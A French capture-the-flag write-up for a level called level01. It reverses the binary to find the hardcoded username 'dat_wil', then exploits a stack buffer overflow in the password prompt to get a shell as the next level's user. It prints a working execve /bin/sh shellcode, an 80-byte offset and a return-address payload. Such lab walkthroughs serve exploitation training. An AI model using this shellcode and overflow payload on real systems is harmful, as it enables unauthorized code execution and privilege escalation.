En inspectant le binaire, on voit que la seule protection est RELRO.
Il s'agit d'une protection empechant la reecriture des adresse de la GOT
(Global Offset Tables).

La stack est quant a elle, toujours executable. On devrait pouvoir executer un shellcode dessus (en cas de BoF).

En executant le binaire pour voir comment il se comporte, on voit tout
simplement qu'il demande un username ainsi qu'un password.
Pas de cas de BoF sur le username. On va donc essayer de reverse le binaire
pour en savoir plus : 

	$ gdb level01
	$ disas main

On peut voir une fonction qui s'appelle : verify_user_name
Regardons de plu pres : 

	$ r2
	$ s sym.verify_user_name
	$ VV

On peut voir qu'une string en clair apparait : dat_wil
Sans doute le username.

En essayant, on voit que c'est le bon username, et maintenant le 
mot de passe nous est demande.

En entrant une enorme string, ca segfault et nous pouvons visiblement ecraser EIP : 

	Program received signal SIGSEGV, Segmentation fault.
	0x41414141 in ?? ()

Il nous suffit de stocker un shellcode dans l'env :

	export SHELLCODE=`python -c 'print "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'`

Il faut maintenant trouver l'offset a partir du quel le binaire segfault.
Apres plusieurs essais on trouve l'offset : 80

Nous avons besoin maintenant de l'adresse de notre variable d'env SHELLCODE.
On peut l'avoir dans gdb :

	$ gdb level01
	$ start
	$ x/1000xg $esp

Puis piocher dans une adresse reliee au nop-sled. Cependant il peut y avoir un decalage memoire entre gdb et notre shell. Donc le plus safe est de 
faire un petit programme C pour recuperer l'adresse de SHELLCODE (voir getenv.c) !NE PAS OUBLIER DE COMPILER AVEC LE FLAG -m32!

Ici, notre adresse est 0xffffd750 donc voici notre payload final :

	python -c "print('dat_wil\n' + 'A'*80 + '\x50\xd7\xff\xff')" > /tmp/payload


	$ cat /tmp/payload - | ./level01

	$ whoami
	=> level02



